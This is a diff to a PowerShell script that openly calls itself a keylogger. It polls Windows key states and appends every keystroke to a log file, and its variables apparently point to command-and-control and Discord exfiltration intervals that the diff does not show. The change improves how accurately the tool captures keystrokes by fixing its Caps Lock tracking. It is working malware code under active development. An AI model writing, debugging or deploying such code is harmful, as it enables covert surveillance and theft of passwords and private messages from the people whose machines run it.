@@ -21,11 +21,13 @@ $c2Interval = 0
 $discordInterval = 0
 $headers = @{ "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" }
 
+# FIXED: Initialize a reliable manual tracker for the Caps Lock state
+$globalCapsState = $false
+
 while ($true) {
     # ================= ENGINE A: HIGH-SPEED CHAR-MAPPED KEYLOGGER =================
     $isShift = (([KeyEngine]::GetAsyncKeyState(16) -band 0x8000) -or ([KeyEngine]::GetAsyncKeyState(160) -band 0x8000) -or ([KeyEngine]::GetAsyncKeyState(161) -band 0x8000))
     $isCtrl  = (([KeyEngine]::GetAsyncKeyState(17) -band 0x8000) -or ([KeyEngine]::GetAsyncKeyState(162) -band 0x8000))
-    $isCaps  = ([KeyEngine]::GetAsyncKeyState(20) -band 0x1)
 
     for ($i = 8; $i -le 190; $i++) {
         if ([KeyEngine]::GetAsyncKeyState($i) -eq -32767) {
@@ -45,8 +47,9 @@ while ($true) {
                 16  { continue } 
                 17  { continue }
                 18  { $keyText = " [ALT] " }
-                # FIXED: Added try-catch writing block and explicit continue to log Caps safely without overlap
+                # FIXED: Manually invert our tracking state whenever key 20 is tapped
                 20  { 
+                    $globalCapsState = !$globalCapsState
                     $keyText = " [CAPS] " 
                     try { $keyText | Out-File $logFile -Append -NoNewline -ErrorAction SilentlyContinue } catch {}
                     continue
@@ -57,7 +60,8 @@ while ($true) {
                 
                 { $_ -ge 65 -and $_ -le 90 } {
                     $letter = [char]$i
-                    if ($isShift -xor $isCaps) { $keyText = $letter.ToString().ToUpper() }
+                    # FIXED: Use the manual $globalCapsState variable instead of the broken [KeyEngine] check
+                    if ($isShift -xor $globalCapsState) { $keyText = $letter.ToString().ToUpper() }
                     else { $keyText = $letter.ToString().ToLower() }
                 }
 
